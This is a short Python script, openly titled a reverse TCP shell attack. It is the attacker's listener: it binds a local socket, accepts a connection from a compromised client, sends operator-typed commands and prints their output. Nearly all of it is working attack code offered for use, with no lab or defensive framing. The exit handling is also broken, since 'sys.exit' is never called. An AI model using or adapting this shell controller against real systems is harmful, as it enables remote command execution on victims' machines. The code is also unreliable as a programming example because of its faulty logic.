# Reverse TCP shell attack

# Imports
import socket
import sys

# Creating socket structure
# Ipv4 address
# Using TCP


sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Binding address
HOST = '127.0.0.1'
# Port
PORT = 12345

# Binding
sock.bind((HOST, PORT))

# Configure the listening state
sock.listen()

# Accept connection and address from client
conn, addr = sock.accept()

# Notify user that connection was made
print(f"Connection has been made from {addr}")

# Creating attacker interface

while True:
    # command for client
    command = input('Enter a command >>> ')
    print("Type exit if you want to quit the process")

    if command == 'exit' or command == 'EXIT':
        sys.exit
    else:
        True
    # Send the encoded message
    conn.send((command.encode()))

    # Recieve a big message
    msg = conn.recv(8096).decode()
    print(msg)

# close connection
conn.close()
